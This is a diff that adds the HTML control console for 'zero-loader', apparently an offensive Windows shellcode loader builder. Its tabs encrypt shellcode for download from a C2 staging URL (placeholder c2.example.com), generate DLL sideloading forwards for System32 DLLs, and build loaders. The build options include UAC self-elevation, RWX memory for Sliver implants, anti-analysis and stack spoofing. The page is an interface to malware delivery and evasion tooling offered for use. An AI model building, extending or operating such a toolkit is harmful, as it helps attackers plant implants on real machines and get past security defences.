@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>zero-loader console</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<header class="top">
+  <div class="brand">
+    <span class="glyph">◼</span>
+    <span class="title">zero-loader</span>
+    <span class="subtitle">console</span>
+  </div>
+  <div class="status-bar">
+    <span class="pill" id="pill-payload">Payload.h —</span>
+    <span class="pill" id="pill-sideload">Sideload.h —</span>
+    <span class="pill warn">127.0.0.1 only</span>
+  </div>
+</header>
+
+<nav class="tabs">
+  <button class="tab active" data-tab="encrypt">1 · Encrypt</button>
+  <button class="tab" data-tab="sideload">2 · Sideload</button>
+  <button class="tab" data-tab="build">3 · Build</button>
+</nav>
+
+<main class="stage">
+
+  <!-- ===== Encrypt ===== -->
+  <section class="panel active" id="panel-encrypt">
+    <div class="panel-head">
+      <h2>Encrypt shellcode</h2>
+      <p>Runs <code>python Encrypt.py &lt;shellcode&gt; --url &lt;url&gt;</code>. Regenerates <code>Payload.h</code> and <code>data.enc</code>.</p>
+    </div>
+
+    <form id="form-encrypt" class="form">
+      <label class="field">
+        <span>Shellcode binary</span>
+        <input type="file" name="shellcode" required>
+      </label>
+
+      <label class="field">
+        <span>Staging URL</span>
+        <input type="url" name="url" placeholder="https://c2.example.com/payload.dat" required>
+      </label>
+
+      <div class="actions">
+        <button type="submit" class="primary">Encrypt</button>
+        <span class="hint">A new Chaskey key, nonce, XOR rotation, and URL cipher are generated on every run.</span>
+      </div>
+    </form>
+
+    <pre class="console" id="out-encrypt"></pre>
+    <details class="preview-wrap">
+      <summary>Payload.h preview (first 4 KB)</summary>
+      <pre class="preview" id="preview-payload"></pre>
+    </details>
+  </section>
+
+  <!-- ===== Sideload ===== -->
+  <section class="panel" id="panel-sideload">
+    <div class="panel-head">
+      <h2>DLL sideload generator</h2>
+      <p>Runs <code>python SideloadGen.py &lt;target.dll&gt;</code>. Generates <code>Sideload.h</code> export forwards and <code>Sideload.rc</code> version info.</p>
+    </div>
+
+    <form id="form-sideload" class="form">
+      <label class="field">
+        <span>Target DLL (original from <code>C:\Windows\System32\</code>)</span>
+        <input type="file" name="dll" required>
+      </label>
+
+      <div class="row">
+        <label class="field">
+          <span>Renamed original (optional)</span>
+          <input type="text" name="rename" placeholder="target_orig.dll">
+        </label>
+        <label class="field">
+          <span>Host EXE hint (optional)</span>
+          <input type="text" name="exe" placeholder="host.exe">
+        </label>
+      </div>
+
+      <div class="actions">
+        <button type="submit" class="primary">Generate</button>
+        <span class="hint">The PE export table is parsed and every export gets a <code>/export:</code> linker pragma pointing at the renamed original.</span>
+      </div>
+    </form>
+
+    <pre class="console" id="out-sideload"></pre>
+  </section>
+
+  <!-- ===== Build ===== -->
+  <section class="panel" id="panel-build">
+    <div class="panel-head">
+      <h2>Build</h2>
+      <p>Runs <code>build.bat</code> (MSVC + ml64 + <code>Mutate.py</code>). Requires Payload.h; sideload mode also requires Sideload.h.</p>
+    </div>
+
+    <form id="form-build" class="form">
+      <div class="row">
+        <label class="field radio">
+          <input type="radio" name="mode" value="exe" checked>
+          <span>EXE loader</span>
+        </label>
+        <label class="field radio">
+          <input type="radio" name="mode" value="sideload">
+          <span>DLL sideload</span>
+        </label>
+      </div>
+
+      <label class="field" id="field-output">
+        <span>Output filename (sideload only)</span>
+        <input type="text" name="output" placeholder="version.dll">
+      </label>
+
+      <fieldset class="field">
+        <legend>Compile-time flags</legend>
+        <label class="check"><input type="checkbox" name="uac">       <span>UAC — <code>/MANIFESTUAC</code> (EXE) or self-elevation (DLL)</span></label>
+        <label class="check"><input type="checkbox" name="rwx">       <span>RWX_SHELLCODE — <code>PAGE_EXECUTE_READWRITE</code> for Go/Sliver</span></label>
+        <label class="check"><input type="checkbox" name="debug">     <span>DEBUG — logs to <code>debug.log</code>, skips anti-analysis</span></label>
+        <label class="check"><input type="checkbox" name="synthetic"> <span>ENABLE_SYNTHETIC_STACK — Draugr MVP RSP swap (opt-in)</span></label>
+      </fieldset>
+
+      <div class="actions">
+        <button type="submit" class="primary">Build</button>
+        <button type="button" id="btn-refresh-arts">Refresh artifacts</button>
+      </div>
+    </form>
+
+    <pre class="console" id="out-build"></pre>
+  </section>
+
+</main>
+
+<aside class="sidebar">
+  <h3>Artifacts</h3>
+  <ul id="artifact-list" class="artifacts"></ul>
+  <p class="footnote">Files in the project root that match <code>*.exe</code> / <code>*.dll</code>.</p>
+</aside>
+
+<script src="app.js"></script>
+</body>
+</html>
